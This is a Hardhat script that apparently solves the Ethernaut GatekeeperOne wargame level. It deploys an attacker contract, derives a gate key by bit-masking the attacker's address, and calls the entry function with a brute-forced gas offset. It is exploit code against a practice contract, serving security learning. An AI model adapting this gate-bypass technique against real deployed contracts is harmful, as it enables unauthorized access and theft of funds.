const { ethers } = require("hardhat");
const { BigNumber } = require("ethers");

const GATEKEEPERONE_CONTRACT_NAME = "GatekeeperOne";
const GATEKEEPERONE_CONTRACT_ADDRESS = "0xa8983A3ef738E059e955030C1691C8eBdc7Ce8F1";
const GATEKEEPERONE_ATTACKER_CONTRACT_NAME = "GatekeeperOne__Attacker";

async function main() {
    const gateKeeperOneFactory = await ethers.getContractFactory(GATEKEEPERONE_CONTRACT_NAME);
    const gateKeeperOneContract = gateKeeperOneFactory.attach(GATEKEEPERONE_CONTRACT_ADDRESS);

    const gateKeeperOneAttackerFactory = await ethers.getContractFactory(GATEKEEPERONE_ATTACKER_CONTRACT_NAME);

    const gateKeeperOneAttackerContract = await gateKeeperOneAttackerFactory.deploy(await gateKeeperOneContract.getAddress());
    const GATEKEEPERONE_ATTACKER_CONTRACT_ADDRESS = await gateKeeperOneAttackerContract.getAddress();
    console.log("GateKeeper Attacker Contract Deployed at: ", GATEKEEPERONE_ATTACKER_CONTRACT_ADDRESS);

    const [attacker] = await ethers.getSigners();
    console.log("Attacker Address: ", attacker);

    const mask = "0xffffffff0000ffff";
    const shortAddress = "0x" + attacker.address.slice(attacker.address.length - 16, attacker.address.length);
    console.log("Attacker Short Address: ", shortAddress);
    const gateKey = BigNumber.from(shortAddress).and(mask);
    console.log("Gate key Address: ", gateKey);

    const offSet = 256; // Find your own offset number through brute force approach

    const tx = await gateKeeperOneAttackerContract.attackEnter(offSet, BigNumber.from(gateKey), { gasLimit: 300000 });
    await tx.wait();
}

main().catch(error => {
    console.error(error);
    process.exit(1);
})